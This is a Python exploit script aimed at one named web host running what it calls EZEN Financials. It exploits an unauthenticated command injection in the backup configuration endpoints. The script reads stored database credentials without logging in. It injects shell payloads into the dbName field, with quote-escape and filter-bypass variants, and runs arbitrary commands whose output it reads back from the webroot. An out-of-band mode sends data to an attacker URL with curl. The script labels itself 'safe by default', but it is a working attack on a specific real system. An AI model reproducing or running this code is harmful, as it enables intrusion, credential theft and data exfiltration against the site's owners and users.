#!/usr/bin/env python3
"""
EZEN FINANCIALS - Unauthenticated OS Command Injection (CMDI) exploit framework
=============================================================================
Target     : https://ezen.tysons.co.ke/
Sink       : POST /backup/saveconf  ->  dbBackupConfig.dbName (unquoted)
             POST /backup/add       ->  com.fms.backup.ejb.BackupBean.save()
                                        builds: mysqldump <cfg...> <dbName> > <out>
                                        the <dbName> token is passed UNQUOTED to /bin/sh
Code exec  : uid=1001(wildfly)  (verified: `id` -> uid=1001(wildfly))
Auth       : NONE required on either endpoint
Web root   : /opt/wildfly/appfiles/uploads/fms/backup/   (served at /appfiles/uploads/fms/backup/)

Modes:
  info      - dump the stored backup config (credential disclosure)
  verify    - benign proof: write id/uname output to webroot, fetch it back
  exec      - run an arbitrary command, exfiltrate stdout via webroot file
  blind     - time-based detection (sleep)
  oob       - out-of-band exfil to an attacker URL (no local file left behind)
  restore   - restore the original dbBackupConfig

SAFE BY DEFAULT: never runs destructive commands; auto-restores config; auto-removes
probe files. Use --no-restore / --keep-artifacts only when you intend to.
"""

import argparse
import json
import random
import re
import string
import sys
import time
import urllib.parse
import urllib.request

BASE = "https://ezen.tysons.co.ke"
WEBROOT = "/opt/wildfly/appfiles/uploads/fms/backup/"   # from backup/list root_file_path
WEBPATH = "/appfiles/uploads/fms/backup/"               # HTTP path to the same dir


# ---------------------------------------------------------------- http helpers
def _req(path, data=None, timeout=90, method=None):
    url = BASE + path
    body = None
    if data is not None:
        body = urllib.parse.urlencode(data).encode()
        method = method or "POST"
    req = urllib.request.Request(url, data=body, method=method or ("POST" if body else "GET"))
    if body:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.read().decode("utf8", "replace")


def post(path, data, timeout=90):
    return _req(path, data, timeout)


def get(path, timeout=30):
    return _req(path, None, timeout)


def lenient_json(body):
    """
    The app mixes two response formats:
      - strict JSON:   {"success":true,...}
      - ExtJS pseudo:  {success:true,data:{"dbBackupConfig.dbName":"..."}}
    Normalise by quoting bare top-level keys before json.loads.
    """
    try:
        return json.loads(body)
    except Exception:
        pass
    # extract a data:{...} blob when present
    m = re.search(r"data\s*:\s*(\{.*\})", body, re.S)
    if m:
        try:
            return {"data": json.loads(m.group(1))}
        except Exception:
            pass
    # quote bare keys like  {success:true
    fixed = re.sub(r"([{,])\s*([A-Za-z_][A-Za-z0-9_]*)\s*:", r'\1"\2":', body)
    return json.loads(fixed)


# ------------------------------------------------------------- config handling
def load_conf():
    """POST /backup/loadconf -> {'dbUser','dbName','dbPassword','id'} (unauthenticated!)"""
    _, body = post("/backup/loadconf", {})
    d = lenient_json(body)["data"]
    return {
        "id": d.get("dbBackupConfig.id"),
        "dbName": d.get("dbBackupConfig.dbName"),
        "dbUser": d.get("dbBackupConfig.dbUser"),
        "dbPassword": d.get("dbBackupConfig.dbPassword"),
    }


def save_conf(cid, dbname, dbuser, dbpass):
    _, body = post("/backup/saveconf", {
        "dbBackupConfig.id": cid,
        "dbBackupConfig.dbName": dbname,
        "dbBackupConfig.dbUser": dbuser,
        "dbBackupConfig.dbPassword": dbpass,
    })
    return lenient_json(body).get("success"), body


def trigger_backup(message="cmdi", timeout=90):
    """POST /backup/add -> runs mysqldump. Returns parsed JSON response."""
    _, body = post("/backup/add", {"backup.id": "1", "backup.message": message}, timeout)
    try:
        return json.loads(body)
    except Exception:
        return {"raw": body}


# ---------------------------------------------------------- payload contexts
def payload_unquoted(cmd):
    """Default context: <dbName> is an unquoted shell word. `;` / `&&` / `|` all work."""
    return "x;{0};#".format(cmd)


def payload_quoted(cmd):
    """If the value is wrapped in double quotes: break out, run, re-open quote."""
    return '";{0};"'.format(cmd)


def payload_squoted(cmd):
    """If wrapped in single quotes: break out, run, re-open quote."""
    return "';{0};'".format(cmd)


def payload_subst(cmd):
    """Command substitution - works even when ';' and '|' are filtered."""
    return "$({0})".format(cmd)


def payload_backtick(cmd):
    return "`{0}`".format(cmd)


def payload_nospace(cmd):
    """Whitespace bypass for filters on spaces/tabs."""
    return "x;{0};#".format(cmd.replace(" ", "${IFS}"))


CONTEXTS = {
    "unquoted": payload_unquoted,
    "quoted": payload_quoted,
    "squoted": payload_squoted,
    "subst": payload_subst,
    "backtick": payload_backtick,
    "nospace": payload_nospace,
}


# ------------------------------------------------------------------- core exec
def _rand(n=10):
    return "".join(random.choice(string.ascii_lowercase) for i in range(n))


def _inject_and_trigger(dbname, conf, message="cmdi", dbuser=None, dbpass=None):
    ok, body = save_conf(conf["id"], dbname,
                         dbuser if dbuser is not None else conf["dbUser"],
                         dbpass if dbpass is not None else conf["dbPassword"])
    if not ok:
        print("[!] saveconf failed: {0}".format(body))
        return None
    return trigger_backup(message)


def exec_via_webroot(cmd, conf, context="unquoted", timeout=90):
    """
    Inject `cmd > WEBROOT/<name> 2>&1;#` then fetch the file over HTTP.
    The trailing `#` comments out the app's own `> outfile` redirect.
    Returns (stdout:str|None, artifact_name:str|None).
    """
    name = "e{0}.txt".format(_rand())
    full = "{0}{1}".format(WEBROOT, name)
    payload_cmd = "{0} > {1} 2>&1".format(cmd, full)
    dbname = CONTEXTS[context](payload_cmd)
    resp = _inject_and_trigger(dbname, conf)
    if resp is None:
        return None, None
    time.sleep(1)
    st, body = get(WEBPATH + name, timeout=30)
    if st == 200 and "404 - Not Found" not in body:
        return body, name
    return None, name


def cleanup_artifact(name, conf):
    """Remove a probe file via the same primitive (fails fast, no full dump)."""
    if not name:
        return
    full = "{0}{1}".format(WEBROOT, name)
    _inject_and_trigger("x;rm -f {0};#".format(full), conf, "cleanup")


def restore(conf):
    save_conf(conf["id"], conf["dbName"], conf["dbUser"], conf["dbPassword"])


# ----------------------------------------------------------------------- modes
def mode_info():
    c = load_conf()
    print("[*] Stored backup configuration (UNAUTHENTICATED read):")
    print("    id        : {0}".format(c["id"]))
    print("    dbName    : {0}".format(c["dbName"]))
    print("    dbUser    : {0}".format(c["dbUser"]))
    print("    dbPassword: {0}".format(c["dbPassword"]))


def mode_verify(context):
    conf = load_conf()
    print("[*] injecting benign probe (context={0}) ...".format(context))
    out, name = exec_via_webroot("id; uname -a; hostname", conf, context)
    if out:
        print("[+] COMMAND OUTPUT (fetched from {0}{1}):".format(WEBPATH, name))
        print("    " + out.strip().replace("\n", "\n    "))
    else:
        print("[-] no output file appeared (context may be wrong)")
    if name:
        cleanup_artifact(name, conf)
        print("[*] artifact removed")
    restore(conf)
    print("[*] config restored")


def mode_exec(cmd, context, keep, no_restore):
    conf = load_conf()
    print("[*] executing: {0}".format(cmd))
    out, name = exec_via_webroot(cmd, conf, context)
    if out:
        print("[+] OUTPUT:\n" + out)
    else:
        print("[-] no output captured")
    if name and not keep:
        cleanup_artifact(name, conf)
        print("[*] artifact removed")
    if not no_restore:
        restore(conf)
        print("[*] config restored")


def mode_blind(context):
    """Time-based: inject `sleep N` and compare against the fast-fail baseline."""
    conf = load_conf()
    n = 6
    print("[*] baseline (bogus db name, no sleep) ...")
    t0 = time.time()
    _inject_and_trigger("nosuchdb_zz", conf, "baseline")
    base = time.time() - t0
    print("    baseline = {0:.2f}s".format(base))
    print("[*] injecting sleep {0} ...".format(n))
    t0 = time.time()
    _inject_and_trigger(CONTEXTS[context]("sleep {0}".format(n)), conf, "blind")
    el = time.time() - t0
    print("    elapsed  = {0:.2f}s".format(el))
    hit = el - base >= n - 1
    print("[+] delay of ~{0:.1f}s => INJECTION {1}".format(el - base, "CONFIRMED" if hit else "NOT confirmed"))
    restore(conf)
    print("[*] config restored")


def mode_oob(url, context):
    """
    Out-of-band: make the server call an attacker-controlled URL.
    URL must be reachable FROM the target (public webhook / interactsh / burp collab).
    """
    conf = load_conf()
    cmd = "curl -s -m 8 {0}/$(id|base64|tr -d '\\n')".format(url)
    print("[*] firing OOB payload -> {0}".format(url))
    resp = _inject_and_trigger(CONTEXTS[context](cmd), conf, "oob")
    print("[*] trigger response: {0}".format(json.dumps(resp)[:300]))
    print("[*] check your listener for a request whose path is the base64 of `id`.")
    restore(conf)
    print("[*] config restored")


# ------------------------------------------------------------------------ main
def main():
    global BASE, WEBROOT, WEBPATH
    ap = argparse.ArgumentParser(description="EZEN Financials unauthenticated CMDI framework")
    ap.add_argument("--base", default=BASE, help="target base url")
    ap.add_argument("--webroot", default=WEBROOT, help="server-side absolute backup dir")
    ap.add_argument("--context", default="unquoted", choices=list(CONTEXTS.keys()))
    ap.add_argument("--no-restore", action="store_true")
    ap.add_argument("--keep-artifacts", action="store_true")
    sub = ap.add_subparsers(dest="mode", required=True)

    sub.add_parser("info")
    sub.add_parser("verify")
    sub.add_parser("restore")

    p = sub.add_parser("exec")
    p.add_argument("cmd", help="command to run on the server")

    sub.add_parser("blind")

    p = sub.add_parser("oob")
    p.add_argument("url", help="attacker callback base url reachable from target")

    a = ap.parse_args()
    BASE = a.base.rstrip("/")
    WEBROOT = a.webroot
    WEBPATH = "/appfiles/uploads/fms/backup/"

    try:
        if a.mode == "info":
            mode_info()
        elif a.mode == "verify":
            mode_verify(a.context)
        elif a.mode == "exec":
            mode_exec(a.cmd, a.context, a.keep_artifacts, a.no_restore)
        elif a.mode == "blind":
            mode_blind(a.context)
        elif a.mode == "oob":
            mode_oob(a.url, a.context)
        elif a.mode == "restore":
            c = load_conf()
            print("[*] current: {0}".format(json.dumps(c)))
            restore(c)
            print("[*] restored")
    except Exception as e:
        print("[!] {0}: {1}".format(type(e).__name__, e))
        try:
            restore(load_conf())
            print("[*] emergency config restore done")
        except Exception:
            pass
        sys.exit(1)


if __name__ == "__main__":
    main()
